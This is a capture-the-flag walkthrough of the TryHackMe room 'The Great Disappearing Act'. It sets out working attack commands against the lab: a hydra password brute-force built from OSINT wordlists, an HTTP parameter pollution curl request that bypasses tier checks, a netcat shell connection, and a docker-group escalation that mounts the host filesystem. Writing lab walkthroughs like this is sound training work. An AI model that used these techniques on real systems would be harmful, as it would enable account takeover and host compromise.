# TryHackMe - The Great Disappearing Act

> *These notes were written with AI assistance for English clarity. Attack paths and commands reflect my own work on the room.*

**Difficulty:** Medium  
**Category:** Web, OSINT, JWT, API Abuse, Docker  
**Series:** Advent of Cyber 2025 — Side Quest 1  
**Room:** [The Great Disappearing Act](https://tryhackme.com/room/sq1-aoc2025)  
**Description:** Can you help Hopper escape his wrongful imprisonment in HopSec asylum?

## Introduction

*"Can you help Hopper escape his wrongful imprisonment in HopSec asylum?"* The first Advent of Cyber 2025 side quest — a multi-stage escape room blending social media OSINT, credential brute-forcing, JWT/API abuse, and Docker privilege escalation to free Hopper from HopSec Asylum.

**Objectives:**
- Activate the side quest with the key from Day 17
- Brute-force guard credentials and unlock Hopper's cell
- Bypass the Psych Ward keypad via the video portal API
- Escalate on the video-ops host and reach the SCADA terminal
- Submit all three flags to escape the facility

**Prerequisite:** Side quest key from [Advent of Cyber Day 17](https://tryhackme.com/room/aocday17).

---

## Activation — Port 21337

Deploy the machine and scan:

```bash
nmap -sV -sC -p- <TARGET_IP>
```

Port `21337` hosts an activation page. Enter the side quest key obtained from the AoC Day 17 room to unlock the full challenge environment.

Add to `/etc/hosts`:

```
<TARGET_IP>  hopsecasylum.com
```

---

## Stage 1 — Guard Credentials (Fakebook OSINT)

### Recon

| Port | Service | Purpose |
|------|---------|---------|
| 80 | HTTP | Security console (redirects) |
| 8000 | HTTP | Fakebook social media |
| 8080 | HTTP | Security console (login works here) |
| 13400 | HTTP | Video portal UI |
| 13401 | HTTP | Video portal API |
| 13404 | Custom | Shell endpoint |
| 9001 | Filtered | SCADA terminal |

Browse Fakebook (`:8000`) and read comments on Sir Carrotbane's posts. Key hints:

- Hopkins forgets his password regularly
- Carrotbane mentions `/opt/hashcat-utils/src/combinator.bin` on the AttackBox
- Hopkins' email appears in a DoorDasher support comment
- A leaked password comment (`Pizza1234$`) forces Hopkins to change it
- Hopkins references his dog **Johnnyboy** and birth year **1982**

### Wordlist combinator attack

Build two wordlists — one with name/keyword variants, one with numbers and symbols (`1982`, `43`, `!`, `$`, etc.) — then combine:

```bash
/opt/hashcat-utils/src/combinator.bin words.txt numbers.txt > combined.txt
```

Brute-force the login on port **8080** (not 80):

```bash
hydra -s 8080 -t 16 -V -f \
  -l "guard.hopkins@hopsecasylum.com" \
  -P combined.txt <TARGET_IP> \
  http-post-form "/cgi-bin/login.sh:username=^USER^&password=^PASS^:Invalid username or password"
```

Log in to the security console and unlock **Cell / Storage** to obtain **Flag 1**.

---

## Stage 2 — Psych Ward Keypad (Video Portal API)

### JWT reconnaissance

Log in to the video portal on port `13400` with guard credentials. Extract the JWT from browser `localStorage`.

The API on port `13401` exposes `/v1/streams/request`. Direct JWT role tampering fails signature validation, but **HTTP Parameter Pollution** works — the server prioritises query parameters over the JSON body.

### HPP exploit

```bash
curl -X POST "http://<TARGET_IP>:13401/v1/streams/request?tier=admin" \
  -H "Authorization: Bearer <VALID_GUARD_JWT>" \
  -d '{"camera_id":"cam-admin","tier":"guard"}'
```

The response grants an admin-tier ticket. Use it to access the admin camera manifest and watch the video feed — it shows someone entering a **6-digit keypad code**.

Submit that code on the Psych Ward door in the security console. You receive the **first half of Flag 2**.

---

## Stage 3 — Shell on Video-Ops Host (Port 13404)

Continue probing the video portal API. A POST endpoint returns a token when the correct parameters are supplied. Connect to port `13404` with netcat and paste the token:

```bash
nc <TARGET_IP> 13404
# paste token when prompted
```

You land a shell as `svc_vidops`. In the home directory, read `user_part2.txt` for the **second half of Flag 2**. Combine both halves and submit the complete flag.

Use the complete Flag 2 as the **SCADA auth token** when interacting with port `9001`.

---

## Stage 4 — SCADA Unlock Code (Docker Escalation)

### Privilege escalation to dockermgr

On the video-ops host, a setuid binary grants access to the `dockermgr` user:

```bash
/usr/local/bin/diag_shell
```

Add yourself to the docker group:

```bash
sg docker -c "/bin/bash"
```

### Inside the SCADA container

List containers and exec into the asylum gate control container:

```bash
docker ps
docker exec -it <CONTAINER_ID> /bin/bash
```

Read the Python source at `/opt/scada/scada_terminal.py` and locate the `UNLOCK_CODE` constant.

Submit that code on the **Asylum Exit SCADA Terminal** in the security console (`:8080`) to obtain **Flag 3**.

---

## Bonus — Hidden Invite Code

For the hidden door (Side Quest 0 — Hopper's Memories), mount the host filesystem from inside a root container:

```bash
sg docker -c "docker run --user root -v /:/host --rm -it <SCADA_IMAGE> /bin/bash"
```

Search the web CGI scripts on the host:

```bash
grep -rnw /host/var/lib/snapd/hostfs/var/www/html/cgi-bin -e "THM" -e "INVITE"
```

The `escape_check.sh` script contains the invite code variable.

---

## Flags

| Flag | How to obtain |
|------|---------------|
| Flag 1 | Unlock Cell / Storage wing after guard login |
| Flag 2 (part 1) | Psych Ward keypad code from admin camera feed |
| Flag 2 (part 2) | `user_part2.txt` on video-ops host via port 13404 shell |
| Flag 3 | SCADA unlock code from `scada_terminal.py` inside Docker container |
| Invite code (bonus) | `INVITE_CODE` in `escape_check.sh` on host filesystem |

*Flag values intentionally omitted. Complete the room on [TryHackMe](https://tryhackme.com/room/sq1-aoc2025).*

---

## Conclusion

### What I learned

| Concept | Lesson |
|---------|--------|
| OSINT chaining | Social media comments leak emails, pet names, and birth years for password attacks |
| Combinator attacks | Pairing wordlists with `combinator.bin` beats naive brute-force |
| JWT limitations | Signature validation blocks naive role tampering — but API logic bugs remain |
| HTTP Parameter Pollution | Query params overriding JSON body fields bypass tier checks |
| Docker group | Membership + setuid binaries = container escape paths |
| SCADA in CTF | Industrial control interfaces often hide final-stage secrets in source code |

---

## References

- [0x85.org Walkthrough](https://0x85.org/sidequest25-1.html)
- [M01's Tech Space](https://mahirm01.page/writeups/the-great-disappearing-act/)
- [Dan Schwarzentraub Walkthrough](https://daniel-schwarzentraub.medium.com/tryhackme-advent-of-cyber-2025-side-quest-1-the-great-disappearing-act-1f7430279b96)
